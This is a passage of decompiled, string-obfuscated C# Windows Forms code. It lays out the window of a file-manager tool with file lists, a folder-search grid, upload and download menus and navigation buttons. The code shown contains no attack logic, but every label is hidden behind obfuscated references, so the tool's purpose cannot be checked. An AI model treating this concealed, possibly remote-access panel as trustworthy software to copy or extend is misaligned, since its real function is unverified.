		dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVFIND.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle6;
		this.DGVFIND.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVFIND.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVFIND.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVFIND.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGVFIND.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		this.DGVFIND.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle7.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		dataGridViewCellStyle7.Font = new System.Drawing.Font(EXGuarder._0C280858, 11f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle7.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVFIND.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
		this.DGVFIND.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVFIND.Columns.AddRange(this.numnamclm, this.numculm, this.acctclum);
		dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle8.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		dataGridViewCellStyle8.Font = new System.Drawing.Font(EXGuarder._0C280858, 11f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle8.ForeColor = System.Drawing.Color.FromArgb(128, 255, 255);
		dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVFIND.DefaultCellStyle = dataGridViewCellStyle8;
		this.DGVFIND.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVFIND.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGVFIND.EnableHeadersVisualStyles = false;
		this.DGVFIND.GridColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVFIND.Location = new System.Drawing.Point(0, 82);
		this.DGVFIND.MultiSelect = false;
		this.DGVFIND.Name = EXGuarder._2B666578;
		this.DGVFIND.ReadOnly = true;
		this.DGVFIND.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		dataGridViewCellStyle9.Font = new System.Drawing.Font(EXGuarder._0C280858, 11f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle9.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVFIND.RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
		this.DGVFIND.RowHeadersVisible = false;
		this.DGVFIND.RowHeadersWidth = 51;
		dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle10.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		dataGridViewCellStyle10.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		dataGridViewCellStyle10.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle10.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVFIND.RowsDefaultCellStyle = dataGridViewCellStyle10;
		this.DGVFIND.RowTemplate.Height = 24;
		this.DGVFIND.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVFIND.Size = new System.Drawing.Size(1231, 671);
		this.DGVFIND.TabIndex = 41;
		this.numnamclm.FillWeight = 140f;
		this.numnamclm.HeaderText = EXGuarder._6D171D16;
		this.numnamclm.MinimumWidth = 6;
		this.numnamclm.Name = EXGuarder._20436645;
		this.numnamclm.ReadOnly = true;
		this.numculm.FillWeight = 40f;
		this.numculm.HeaderText = EXGuarder._2A4E555B;
		this.numculm.MinimumWidth = 6;
		this.numculm.Name = EXGuarder._1D0B2A45;
		this.numculm.ReadOnly = true;
		this.acctclum.FillWeight = 60f;
		this.acctclum.HeaderText = EXGuarder._49730347;
		this.acctclum.MinimumWidth = 6;
		this.acctclum.Name = EXGuarder._0F534F3D;
		this.acctclum.ReadOnly = true;
		this.Panel5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel5.Controls.Add(this.srchfilsbtn);
		this.Panel5.Controls.Add(this.clrbtn);
		this.Panel5.Controls.Add(this.DrakeWidth_W10);
		this.Panel5.Controls.Add(this.comsrchfor);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel5.Location = new System.Drawing.Point(0, 36);
		this.Panel5.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel5.Name = EXGuarder._6C481422;
		this.Panel5.Padding = new System.Windows.Forms.Padding(11, 10, 11, 10);
		this.Panel5.Size = new System.Drawing.Size(1231, 46);
		this.Panel5.TabIndex = 1;
		this.srchfilsbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.srchfilsbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.srchfilsbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchfilsbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.srchfilsbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchfilsbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchfilsbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchfilsbtn.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.srchfilsbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.srchfilsbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.srchfilsbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.srchfilsbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.srchfilsbtn.Location = new System.Drawing.Point(221, 10);
		this.srchfilsbtn.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.srchfilsbtn.Name = EXGuarder._026B3C4B;
		this.srchfilsbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.srchfilsbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.srchfilsbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.srchfilsbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.srchfilsbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.srchfilsbtn.Size = new System.Drawing.Size(123, 26);
		this.srchfilsbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.srchfilsbtn.Symbol = 61671;
		this.srchfilsbtn.TabIndex = 53;
		this.srchfilsbtn.Text = EXGuarder._166F3B00;
		this.clrbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.clrbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.clrbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clrbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clrbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clrbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clrbtn.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.clrbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.clrbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clrbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clrbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.clrbtn.Location = new System.Drawing.Point(1097, 10);
		this.clrbtn.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.clrbtn.Name = EXGuarder._685B3D47;
		this.clrbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.clrbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.clrbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clrbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clrbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.clrbtn.Size = new System.Drawing.Size(123, 26);
		this.clrbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.clrbtn.Symbol = 61741;
		this.clrbtn.TabIndex = 52;
		this.clrbtn.Text = EXGuarder._59111269;
		this.DrakeWidth_W10.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W10.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W10.Location = new System.Drawing.Point(186, 10);
		this.DrakeWidth_W10.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W10.Name = EXGuarder._3A796132;
		this.DrakeWidth_W10.Size = new System.Drawing.Size(35, 26);
		this.DrakeWidth_W10.TabIndex = 41;
		this.comsrchfor.Dock = System.Windows.Forms.DockStyle.Left;
		this.comsrchfor.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comsrchfor.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.comsrchfor.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.comsrchfor.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.comsrchfor.Items.AddRange(new object[4]
		{
			EXGuarder._4A432C37,
			EXGuarder._04711E38,
			EXGuarder._035C4808,
			EXGuarder._6A402302
		});
		this.comsrchfor.Location = new System.Drawing.Point(11, 10);
		this.comsrchfor.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.comsrchfor.MinimumSize = new System.Drawing.Size(63, 0);
		this.comsrchfor.Name = EXGuarder._044F1665;
		this.comsrchfor.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comsrchfor.Radius = 15;
		this.comsrchfor.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comsrchfor.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comsrchfor.Size = new System.Drawing.Size(175, 25);
		this.comsrchfor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comsrchfor.TabIndex = 0;
		this.comsrchfor.Text = EXGuarder._3C355A3E;
		this.comsrchfor.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel7.Controls.Add(this.Label3);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel7.Location = new System.Drawing.Point(0, 0);
		this.Panel7.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel7.Name = EXGuarder._4606361C;
		this.Panel7.Size = new System.Drawing.Size(1231, 36);
		this.Panel7.TabIndex = 0;
		this.Label3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Label3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Label3.Font = new System.Drawing.Font(EXGuarder._0C280858, 12f);
		this.Label3.ForeColor = System.Drawing.Color.Silver;
		this.Label3.Location = new System.Drawing.Point(0, 0);
		this.Label3.Name = EXGuarder._01661A1A;
		this.Label3.Size = new System.Drawing.Size(1231, 36);
		this.Label3.TabIndex = 0;
		this.Label3.Text = EXGuarder._38155437;
		this.Label3.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel12.Controls.Add(this.TableLayoutPanel3);
		this.Panel12.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel12.Location = new System.Drawing.Point(5, 6);
		this.Panel12.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel12.Name = EXGuarder._0C525D24;
		this.Panel12.Size = new System.Drawing.Size(1231, 48);
		this.Panel12.TabIndex = 37;
		this.TableLayoutPanel3.ColumnCount = 3;
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel3.Controls.Add(this.nav3btn, 0, 0);
		this.TableLayoutPanel3.Controls.Add(this.nav2btn, 0, 0);
		this.TableLayoutPanel3.Controls.Add(this.nav1btn, 0, 0);
		this.TableLayoutPanel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TableLayoutPanel3.Location = new System.Drawing.Point(0, 0);
		this.TableLayoutPanel3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.TableLayoutPanel3.Name = EXGuarder._65546F28;
		this.TableLayoutPanel3.RowCount = 1;
		this.TableLayoutPanel3.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
		this.TableLayoutPanel3.Size = new System.Drawing.Size(1231, 48);
		this.TableLayoutPanel3.TabIndex = 37;
		this.nav3btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.nav3btn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.nav3btn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav3btn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.nav3btn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav3btn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav3btn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav3btn.Font = new System.Drawing.Font(EXGuarder._0C280858, 10f, System.Drawing.FontStyle.Bold);
		this.nav3btn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nav3btn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav3btn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav3btn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nav3btn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.nav3btn.Location = new System.Drawing.Point(823, 2);
		this.nav3btn.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.nav3btn.Name = EXGuarder._6C1A4E53;
		this.nav3btn.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.nav3btn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.nav3btn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.nav3btn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav3btn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav3btn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.nav3btn.Size = new System.Drawing.Size(405, 44);
		this.nav3btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.nav3btn.Symbol = 61616;
		this.nav3btn.SymbolSize = 25;
		this.nav3btn.TabIndex = 67;
		this.nav3btn.Text = EXGuarder._3418092E;
		this.nav3btn.TipsColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav2btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.nav2btn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.nav2btn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav2btn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.nav2btn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav2btn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav2btn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav2btn.Font = new System.Drawing.Font(EXGuarder._0C280858, 10f, System.Drawing.FontStyle.Bold);
		this.nav2btn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nav2btn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav2btn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav2btn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nav2btn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.nav2btn.Location = new System.Drawing.Point(413, 2);
		this.nav2btn.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.nav2btn.Name = EXGuarder._58202703;
		this.nav2btn.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.nav2btn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.nav2btn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.nav2btn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav2btn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav2btn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.nav2btn.Size = new System.Drawing.Size(404, 44);
		this.nav2btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.nav2btn.Symbol = 61677;
		this.nav2btn.SymbolSize = 25;
		this.nav2btn.TabIndex = 68;
		this.nav2btn.Text = EXGuarder._3C087278;
		this.nav2btn.TipsColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.nav1btn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.nav1btn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav1btn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.nav1btn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav1btn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav1btn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav1btn.Font = new System.Drawing.Font(EXGuarder._0C280858, 10f, System.Drawing.FontStyle.Bold);
		this.nav1btn.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nav1btn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.nav1btn.Location = new System.Drawing.Point(3, 2);
		this.nav1btn.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.nav1btn.Name = EXGuarder._3E655335;
		this.nav1btn.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.nav1btn.RectColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.nav1btn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.nav1btn.Size = new System.Drawing.Size(404, 44);
		this.nav1btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.nav1btn.Symbol = 61564;
		this.nav1btn.SymbolSize = 25;
		this.nav1btn.TabIndex = 66;
		this.nav1btn.Text = EXGuarder._4B303016;
		this.nav1btn.TipsColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.Panel4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel4.Controls.Add(this.statetext);
		this.Panel4.Controls.Add(this.baseloader);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel4.Location = new System.Drawing.Point(3, 851);
		this.Panel4.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel4.Name = EXGuarder._5A66720C;
		this.Panel4.Padding = new System.Windows.Forms.Padding(4);
		this.Panel4.Size = new System.Drawing.Size(1241, 30);
		this.Panel4.TabIndex = 37;
		this.statetext.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.statetext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.statetext.Font = new System.Drawing.Font(EXGuarder._0C280858, 8f, System.Drawing.FontStyle.Bold);
		this.statetext.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.statetext.Location = new System.Drawing.Point(49, 4);
		this.statetext.Name = EXGuarder._714A3A17;
		this.statetext.Size = new System.Drawing.Size(1188, 22);
		this.statetext.TabIndex = 0;
		this.statetext.Text = EXGuarder._5B254268;
		this.statetext.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.baseloader.Dock = System.Windows.Forms.DockStyle.Left;
		this.baseloader.Enabled = false;
		this.baseloader.Font = new System.Drawing.Font(EXGuarder._0C280858, 12f);
		this.baseloader.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.baseloader.Location = new System.Drawing.Point(4, 4);
		this.baseloader.Name = EXGuarder._29611F37;
		this.baseloader.Size = new System.Drawing.Size(45, 22);
		this.baseloader.Style = DrakeUI.Framework.UIStyle.Custom;
		this.baseloader.TabIndex = 63;
		this.baseloader.Text = EXGuarder._3E495549;
		this.baseloader.Visible = false;
		this.statetimer.Interval = 2000;
		this.FilesUpload.FileName = EXGuarder._3C206511;
		this.FilesUpload.Multiselect = true;
		this.FilesUpload.RestoreDirectory = true;
		this.Panel8.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel8.Controls.Add(this.tabsfiles);
		this.Panel8.Controls.Add(this.Panel12);
		this.Panel8.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel8.Location = new System.Drawing.Point(3, 38);
		this.Panel8.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel8.Name = EXGuarder._066B0866;
		this.Panel8.Padding = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.Panel8.Size = new System.Drawing.Size(1241, 813);
		this.Panel8.TabIndex = 3;
		this.BTtiptool.AutomaticDelay = 100;
		this.BTtiptool.AutoPopDelay = 1000;
		this.BTtiptool.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.BTtiptool.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.BTtiptool.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.BTtiptool.InitialDelay = 10;
		this.BTtiptool.OwnerDraw = true;
		this.BTtiptool.RectColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.BTtiptool.ReshowDelay = 20;
		this.BTtiptool.ShowAlways = true;
		this.BTtiptool.TitleFont = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.BTtiptool.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
		this.BTtiptool.ToolTipTitle = EXGuarder._0A576456;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(1247, 884);
		base.ControlBox = false;
		base.Controls.Add(this.Panel8);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.DrakeWidth_W1);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.DrakeWidth_W8);
		base.Controls.Add(this.DrakeWidth_W5);
		base.Controls.Add(this.DrakeWidth_W6);
		base.Controls.Add(this.DrakeWidth_W7);
		this.DoubleBuffered = true;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._4509446B);
		base.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.MinimumSize = new System.Drawing.Size(863, 822);
		base.Name = EXGuarder._4D11424D;
		this.Text = EXGuarder._64412576;
		this.Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.ctxMenu.ResumeLayout(false);
		this.tabsfiles.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.listfilesvew).EndInit();
		this.Panel3.ResumeLayout(false);
		this.Panel3.PerformLayout();
		this.Panel9.ResumeLayout(false);
		this.Panel6.ResumeLayout(false);
		this.Panel13.ResumeLayout(false);
		this.viwimagepanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.viwimage).EndInit();
		this.TableLayoutPanel2.ResumeLayout(false);
		this.Panel11.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.TabPage2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVDATA).EndInit();
		this.ctxdowns.ResumeLayout(false);
		this.TabPage3.ResumeLayout(false);
		this.filesscanpanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVFIND).EndInit();
		this.Panel5.ResumeLayout(false);
		this.Panel7.ResumeLayout(false);
		this.Panel12.ResumeLayout(false);
		this.TableLayoutPanel3.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		this.Panel8.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void translateme()
	{
		try
		{
			DGVFIND.Columns[0].HeaderText = BTConst.folderpathstr;
			DGVFIND.Columns[1].HeaderText = BTConst.filescuntstr;
			DGVFIND.Columns[2].HeaderText = BTConst.chngdatestr;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		object value = BTRegistry.GetValue(EXGuarder._2B547447, EXGuarder._2D057079);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._5D0F5635, TextCompare: false))
		{
			tabsfiles.TabPages[0].Text = EXGuarder._4C2F5A6B;
			tabsfiles.TabPages[1].Text = EXGuarder._6A297013;
			tabsfiles.TabPages[2].Text = EXGuarder._5E1E512D;
			emptytext.Text = EXGuarder._31243E79;
			ctxMenu.Items[0].Text = EXGuarder._6E3E6458;
			ToolStripMenuItem toolStripMenuItem = (ToolStripMenuItem)ctxMenu.Items[0];
			toolStripMenuItem.DropDownItems[0].Text = EXGuarder._1D36322A;
			toolStripMenuItem.DropDownItems[1].Text = EXGuarder._37493746;
			toolStripMenuItem.DropDownItems[2].Text = EXGuarder._6A297013;
			toolStripMenuItem.DropDownItems[3].Text = EXGuarder._79566120;
			toolStripMenuItem.DropDownItems[4].Text = EXGuarder._1C736D1C;
			toolStripMenuItem.DropDownItems[5].Text = EXGuarder._135B1237;
			BTtiptool.SetToolTip(shortbtn1, EXGuarder._1D36322A);
			BTtiptool.SetToolTip(shortbtn2, EXGuarder._37493746);
			BTtiptool.SetToolTip(shortbtn4, EXGuarder._6A297013);
			BTtiptool.SetToolTip(shortbtn3, EXGuarder._79566120);
			BTtiptool.SetToolTip(shortbtn6, EXGuarder._1C736D1C);
			BTtiptool.SetToolTip(shortbtn5, EXGuarder._135B1237);
			ctxMenu.Items[1].Text = EXGuarder._03300440;
			ctxMenu.Items[2].Text = EXGuarder._383E5309;
			ctxMenu.Items[3].Text = EXGuarder._6420691A;
			ctxMenu.Items[4].Text = EXGuarder._4B631811;
			ctxMenu.Items[5].Text = EXGuarder._2F6F4A59;
			ctxMenu.Items[6].Text = EXGuarder._452B286A;
			ctxMenu.Items[7].Text = EXGuarder._0513626E;
			ctxMenu.Items[8].Text = EXGuarder._1A344B61;
			ctxMenu.Items[9].Text = EXGuarder._6F296134;
			ctxMenu.Items[10].Text = EXGuarder._28533B71;
			ctxMenu.Items[11].Text = EXGuarder._4039666B;
			ctxMenu.Items[12].Text = EXGuarder._300A3708;
			ctxMenu.Items[13].Text = EXGuarder._774C6716;
			ctxMenu.Items[14].Text = EXGuarder._486F1432;
			ctxMenu.Items[15].Text = EXGuarder._3057292E;
			ctxMenu.Items[16].Text = EXGuarder._515E5C13;
			ctxMenu.Items[17].Text = EXGuarder._69197368;
			ctxMenu.Items[18].Text = EXGuarder._744D4319;
			ctxMenu.Items[19].Text = EXGuarder._0C5F1806;
			ctxMenu.Items[20].Text = EXGuarder._02251946;
			searchtext.Watermark = EXGuarder._79044800;
			srchfilsbtn.Text = EXGuarder._0B170967;
			clrbtn.Text = EXGuarder._36583445;
			Label3.Text = EXGuarder._63177903;
